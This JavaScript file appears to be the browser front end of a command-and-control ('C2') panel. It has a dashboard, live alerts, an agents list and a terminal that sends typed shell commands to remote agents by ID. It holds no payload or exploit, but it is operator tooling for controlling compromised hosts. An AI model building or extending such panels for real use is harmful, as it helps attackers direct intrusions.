/**
 * C2 PANEL - Main JavaScript
 */

(function() {
    'use strict';

    // ============================================
    // UTILITY FUNCTIONS
    // ============================================

    const Utils = {
        formatDate: function(dateStr) {
            if (!dateStr) return '-';
            const d = new Date(dateStr);
            return d.toLocaleString();
        },

        formatStatus: function(status) {
            const map = {
                'online': '<span class="status-badge online">● ONLINE</span>',
                'offline': '<span class="status-badge offline">● OFFLINE</span>',
                'pending': '<span class="status-badge pending">● PENDING</span>',
                'completed': '<span class="status-badge completed">✓ COMPLETED</span>'
            };
            return map[status] || status;
        },

        escapeHtml: function(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    };

    // ============================================
    // DASHBOARD
    // ============================================

    class Dashboard {
        constructor() {
            this.init();
        }

        init() {
            this.updateStats();
            this.initWebSocket();
            this.initAlerts();
        }

        updateStats() {
            // Stats are rendered server-side
            // This is for dynamic updates
            setInterval(() => {
                fetch('/api/stats')
                    .then(res => res.json())
                    .then(data => {
                        // Update stats
                    })
                    .catch(err => console.error('Stats update failed:', err));
            }, 30000);
        }

        initWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const ws = new WebSocket(`${protocol}//${window.location.host}/socket.io/?EIO=4&transport=websocket`);

            ws.onopen = function() {
                console.log('[WebSocket] Connected');
            };

            ws.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type === 'new_alert') {
                        Dashboard.showAlert(data.message);
                    }
                } catch (e) {
                    // Ignore ping/pong
                }
            };

            ws.onclose = function() {
                console.log('[WebSocket] Disconnected, reconnecting...');
                setTimeout(() => this.initWebSocket(), 5000);
            };
        }

        static showAlert(message) {
            const container = document.getElementById('alertContainer');
            if (!container) return;

            const alert = document.createElement('div');
            alert.className = 'alert-item';
            alert.innerHTML = `
                <span class="alert-icon">🚨</span>
                <span class="alert-message">${Utils.escapeHtml(message)}</span>
                <span class="alert-time">${new Date().toLocaleTimeString()}</span>
            `;
            container.prepend(alert);

            // Limit alerts
            while (container.children.length > 50) {
                container.removeChild(container.lastChild);
            }
        }
    }

    // ============================================
    // TERMINAL
    // ============================================

    class Terminal {
        constructor(agentId) {
            this.agentId = agentId;
            this.terminal = document.getElementById('terminal');
            this.input = document.getElementById('commandInput');
            this.history = [];
            this.historyIndex = -1;
            this.init();
        }

        init() {
            if (this.input) {
                this.input.addEventListener('keydown', this.handleKey.bind(this));
                this.input.focus();
            }
        }

        appendOutput(text, type = 'output') {
            if (!this.terminal) return;
            const div = document.createElement('div');
            div.className = type;
            div.textContent = text;
            this.terminal.appendChild(div);
            this.terminal.scrollTop = this.terminal.scrollHeight;
        }

        async sendCommand(command) {
            if (!command.trim()) return;

            this.appendOutput(`$ ${command}`, 'prompt');
            this.history.push(command);
            this.historyIndex = this.history.length;

            try {
                const response = await fetch(`/api/agent/${this.agentId}/command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: command })
                });

                if (response.ok) {
                    this.appendOutput('[✓] Command sent to agent', 'output');
                } else {
                    this.appendOutput('[✗] Failed to send command', 'error');
                }
            } catch (e) {
                this.appendOutput(`[✗] Error: ${e.message}`, 'error');
            }
        }

        handleKey(e) {
            if (e.key === 'Enter') {
                const command = this.input.value;
                this.input.value = '';
                this.sendCommand(command);
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (this.historyIndex > 0) {
                    this.historyIndex--;
                    this.input.value = this.history[this.historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (this.historyIndex < this.history.length - 1) {
                    this.historyIndex++;
                    this.input.value = this.history[this.historyIndex];
                } else {
                    this.historyIndex = this.history.length;
                    this.input.value = '';
                }
            }
        }
    }

    // ============================================
    // AGENTS TABLE
    // ============================================

    class AgentsTable {
        constructor() {
            this.init();
        }

        init() {
            // Auto-refresh agents list
            setInterval(() => {
                this.refresh();
            }, 30000);
        }

        refresh() {
            fetch('/api/agents')
                .then(res => res.json())
                .then(data => {
                    // Update table
                })
                .catch(err => console.error('Refresh failed:', err));
        }
    }

    // ============================================
    // INIT
    // ============================================

    document.addEventListener('DOMContentLoaded', function() {
        // Dashboard
        if (document.querySelector('.stats')) {
            new Dashboard();
        }

        // Terminal
        const agentId = document.querySelector('.agent-id');
        if (agentId) {
            new Terminal(agentId.textContent);
        }

        // Agents table
        if (document.querySelector('.agents-table')) {
            new AgentsTable();
        }

        console.log('[C2 Panel] Initialized');
    });

})();
